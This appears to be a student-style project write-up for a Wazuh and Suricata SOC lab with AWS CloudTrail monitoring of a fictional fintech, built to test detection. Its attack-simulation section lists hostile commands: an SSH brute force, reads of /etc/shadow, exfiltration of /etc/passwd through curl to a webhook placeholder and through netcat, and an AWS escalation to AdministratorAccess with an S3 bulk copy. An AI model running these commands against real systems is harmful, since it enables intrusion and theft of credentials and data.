# Project Documentation
## SOC Threat Visibility Lab

---

## Project Summary

This project implements a fully operational threat detection and monitoring system for FireOps Systems, a fictional fintech startup operating across Africa with on-premise and AWS cloud infrastructure.

---

## Environment Setup

### Manager VM — Kali Linux
- Wazuh Manager 4.14.5
- Wazuh Indexer
- Wazuh Dashboard
- Deployed via Docker Compose (single-node)

### Agent VM — Ubuntu 22.04
- Wazuh Agent 4.14.5
- Suricata IDS
- Logs: auth.log, syslog, eve.json

### Cloud — AWS
- CloudTrail enabled across all regions
- Logs stored in S3 bucket
- Pulled into Wazuh every 10 minutes via aws-s3 wodle

---

## Phase 1 — Wazuh Installation

Deployed using official Wazuh Docker Compose:
```bash
git clone https://github.com/wazuh/wazuh-docker.git
cd wazuh-docker/single-node
docker-compose up -d
```

---

## Phase 2 — Agent Installation (Ubuntu)

```bash
curl -sO https://packages.wazuh.com/4.7/wazuh-agent_4.7.0-1_amd64.deb
sudo dpkg -i wazuh-agent_4.7.0-1_amd64.deb
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

---

## Phase 3 — AWS CloudTrail Integration

1. Enabled CloudTrail in AWS Console
2. Created S3 bucket for log storage
3. Created IAM user with S3 read permissions
4. Added aws-s3 wodle block to ossec.conf
5. Added AWS credentials to Wazuh container

---

## Phase 4 — Attack Simulations

### Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<ubuntu-ip>
```

### Privilege Escalation
```bash
sudo su
sudo cat /etc/shadow
find / -perm -4000 -type f 2>/dev/null
```

### Data Exfiltration
```bash
curl -X POST https://webhook.site/your-url --data @/etc/passwd
cat /etc/passwd | nc <kali-ip> 9999
```

### Network Port Scan
```bash
nmap -A -v <ubuntu-ip>
```

### AWS Attacks
```bash
aws iam list-users
aws iam list-roles
aws iam attach-user-policy --user-name wazuh-aws --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws s3 ls s3://your-bucket --recursive
aws s3 cp s3://your-bucket /tmp/stolen-data/ --recursive
```

---

## Phase 5 — Dashboards Created

- **SOC Analyst Dashboard** — alert severity, top rules, MITRE ATT&CK, agent counts
- **Executive Dashboard** — total incidents, severity breakdown, alerts trend

---

## Challenges & Solutions

| Challenge | Solution |
|-----------|----------|
| Azure cloud — no logs after 5 days | Switched to AWS CloudTrail |
| Wazuh API disconnecting | Fixed ossec.conf file permissions (root:wazuh) |
| Docker container no internet | Enabled network on host machine |
| Duplicate rule ID 100001 | Renamed second rule to 100002 |
| AWS credentials not found | Copied credentials to /var/ossec/.aws/ |
| ossec.conf XML error line 0 | Fixed file ownership chown root:wazuh |
